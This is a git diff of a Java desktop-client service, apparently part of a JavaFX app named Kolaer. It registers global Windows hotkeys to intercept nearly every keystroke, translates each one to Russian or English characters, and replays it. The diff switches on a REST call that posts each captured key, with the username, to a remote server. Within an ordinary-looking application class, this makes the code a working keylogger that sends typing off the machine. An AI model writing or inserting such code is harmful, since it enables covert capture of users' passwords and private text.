@@ -1,9 +1,7 @@
 package ru.kolaer.client.javafx.services;
 
 import java.awt.event.KeyEvent;
-import java.awt.im.InputContext;
 import java.nio.charset.Charset;
-import java.util.Locale;
 import java.util.concurrent.CompletableFuture;
 
 import org.slf4j.Logger;
@@ -11,6 +9,7 @@ import org.slf4j.LoggerFactory;
 import org.springframework.http.converter.StringHttpMessageConverter;
 import org.springframework.web.client.RestTemplate;
 
+import ru.kolaer.client.javafx.tools.Resources;
 import ru.kolaer.client.javafx.tools.User32;
 import ru.kolaer.client.javafx.tools.User32.MSG;
 
@@ -22,11 +21,12 @@ public class UserWindowsKeyListenerService implements LocaleService {
 	
 	private boolean isCapsLock = false;
 	private boolean isRus = false;
+	private int id;
 	
 	private boolean isRun = false;
 
 	/**
-	 * {@linkplain UserWindowsKeyListenerService.java}
+	 * {@linkplain UserWindowsKeyListenerService}
 	 */
 	public UserWindowsKeyListenerService() {
 		this.restTemplate.getMessageConverters().add(0, new StringHttpMessageConverter(Charset.forName("UTF-8")));
@@ -49,25 +49,23 @@ public class UserWindowsKeyListenerService implements LocaleService {
 
 	@Override
 	public void run() throws Exception {
-		
 		CompletableFuture.runAsync(() -> {
 			for(int i = 8; i <= 222; i++){
 				User32.RegisterHotKey(null, i, 0, i);
-				User32.RegisterHotKey(null, i + 1000, 0x0001, i);
-				User32.RegisterHotKey(null, i + 2000, 0x0002, i);
-				User32.RegisterHotKey(null, i + 3000, 0x0004, i);
-				User32.RegisterHotKey(null, i + 4000, 0x0008, i);
+				if(id>40) {
+					User32.RegisterHotKey(null, i + 1000, 0x0001, i);
+					User32.RegisterHotKey(null, i + 2000, 0x0002, i);
+					User32.RegisterHotKey(null, i + 3000, 0x0004, i);
+					User32.RegisterHotKey(null, i + 4000, 0x0008, i);
+				}
 			}
 		}).thenRunAsync(() -> {
-			if(InputContext.getInstance().getLocale().getLanguage().equals(new Locale("ru").getLanguage())){
-				this.isRus = true;
-			}
-
+			Thread.currentThread().setName("Прослушивание клавиатуры");
+			
+			final MSG msg = new MSG();
+			
 			if(User32.GetKeyState(20) == 1)
 				this.isCapsLock = true;
-
-		}).thenRunAsync(() -> {
-			final MSG msg = new MSG();
 			
 			boolean shift = false;
 			boolean ctrl = false;
@@ -77,49 +75,53 @@ public class UserWindowsKeyListenerService implements LocaleService {
 				while(User32.GetMessage(msg, null, 0, 0, User32.PM_REMOVE)){
 					if(msg.message == User32.WM_HOTKEY){
 						
-						int id = msg.wParam.intValue();
+						if(!this.isRun)
+							break;
+						
+						this.id = msg.wParam.intValue();
 
-						if(id > 4000)
-							id -= 4000;
-						else if(id > 3000)
-							id -= 3000;
-						else if(id > 2000)
-							id -= 2000;
-						if(id > 1000)
-							id -= 1000;
+						if(this.id > 4000)
+							this.id -= 4000;
+						else if(this.id > 3000)
+							this.id -= 3000;
+						else if(this.id > 2000)
+							this.id -= 2000;
+						if(this.id > 1000)
+							this.id -= 1000;
 						
-						final int idKey = id;
+						User32.UnregisterHotKey(null, this.id);
+						//if(id>40) {
+							User32.UnregisterHotKey(null, this.id + 1000);
+							User32.UnregisterHotKey(null, this.id + 2000);
+							User32.UnregisterHotKey(null, this.id + 3000);
+							User32.UnregisterHotKey(null, this.id + 4000);
+						//}
 						
-						User32.UnregisterHotKey(null, idKey);
-						User32.UnregisterHotKey(null, idKey + 1000);
-						User32.UnregisterHotKey(null, idKey + 2000);
-						User32.UnregisterHotKey(null, idKey + 3000);
-						User32.UnregisterHotKey(null, idKey + 4000);
-						
-						CompletableFuture.runAsync(() -> {							
-							if(idKey == 20)
-								isCapsLock = !isCapsLock;
+						CompletableFuture.runAsync(() -> {	
+							Thread.currentThread().setName("Отправление клавиши на сервер");
+							if(this.id == 20)
+								this.isCapsLock = !this.isCapsLock;
 
 							this.isRus = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), 0)) == 25 ? true : false;
-							String key = this.isRus ? getRusKey(idKey) : getEngKey(idKey);
+							String key = this.isRus ? getRusKey(this.id) : getEngKey(this.id);
 						
 							if(User32.GetKeyState(16) < 0){
-								key = this.getShiftKey(idKey, key);
-							}else if(isCapsLock){
-								if(65 <= idKey && idKey <= 90){
+								key = this.getShiftKey(this.id, key);
+							}else if(this.isCapsLock){
+								if(65 <= this.id && this.id <= 90){
 									key = key.toUpperCase();
 								}
 							}
-							LOG.info("ID: {} - ({})", idKey, key);
+							LOG.info("ID: {} - ({})", this.id, key);
 							
-							//this.restTemplate.postForObject(Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key", key, String.class);
+							this.restTemplate.postForObject(Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key", key, String.class);
 							
 						}).exceptionally(t -> {	
-							LOG.error("Невозможно отправить сообщение!",t);
+							LOG.error("Невозможно отправить сообщение на {}!", Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key");
 							return null;
 						});
 						
-						User32.keybd_event(idKey, 0, 0, 0);;
+						User32.keybd_event(this.id, 0, 0, 0);;
 
 						if(shift && (User32.GetKeyState(0xA1) & 0x8000) == 0){
 							shift = false;
@@ -137,29 +139,33 @@ public class UserWindowsKeyListenerService implements LocaleService {
 
 						if(alt && (User32.GetKeyState(0xA5) & 0x8000) == 0){
 							alt = false;
-							User32.keybd_event(0x10, 0, 2, 0);
+							User32.keybd_event(0x12, 0, 2, 0);
 						} else if((User32.GetKeyState(0xA5) & 0x8000) == 32768){
 								alt = true;
 						}
 
-						User32.RegisterHotKey(null, idKey, 0, idKey);
-						User32.RegisterHotKey(null, idKey + 1000, 0x0001, idKey);
-						User32.RegisterHotKey(null, idKey + 2000, 0x0002, idKey);
-						User32.RegisterHotKey(null, idKey + 3000, 0x0004, idKey);
-						User32.RegisterHotKey(null, idKey + 4000, 0x0008, idKey);
+						User32.RegisterHotKey(null, this.id, 0, this.id);
+						if(id>40) {
+							User32.RegisterHotKey(null, this.id + 1000, 0x0001, this.id);
+							User32.RegisterHotKey(null, this.id + 2000, 0x0002, this.id);
+							User32.RegisterHotKey(null, this.id + 3000, 0x0004, this.id);
+							User32.RegisterHotKey(null, this.id + 4000, 0x0008, this.id);
+						}
 					}
 				}
 			}
+		}).exceptionally(t -> {
+			LOG.error("Ошибка!", t);
+			return null;
 		});
 	}
 
 	@Override
 	public void stop() throws Exception {
-		// TODO Auto-generated method stub
-
+		this.isRun = false;
 	}
 
-	public String getShiftKey(int code, final String key) {
+	private String getShiftKey(int code, final String key) {
 		
 		if(65 <= code && code <= 90){
 			return this.isCapsLock ? key.toLowerCase() : key.toUpperCase();
@@ -183,7 +189,7 @@ public class UserWindowsKeyListenerService implements LocaleService {
 		}
 	}
 	
-	public String getRusKey(int code) {
+	private String getRusKey(int code) {
 		switch(code) {
 			case 65: return "ф";
 			case 66: return "и";
@@ -254,7 +260,7 @@ public class UserWindowsKeyListenerService implements LocaleService {
 		}
 	}
 
-	public String getEngKey(int code) {
+	private String getEngKey(int code) {
 		switch(code) {
 			case 8:
 				return "<BaskSpace>";
@@ -469,7 +475,7 @@ public class UserWindowsKeyListenerService implements LocaleService {
 	 * @return
 	 * @deprecated
 	 */
-	public int getKeyEvent(int code) {
+	private int getKeyEvent(int code) {
 		switch(code) {
 			case 13:
 				return KeyEvent.VK_ENTER;
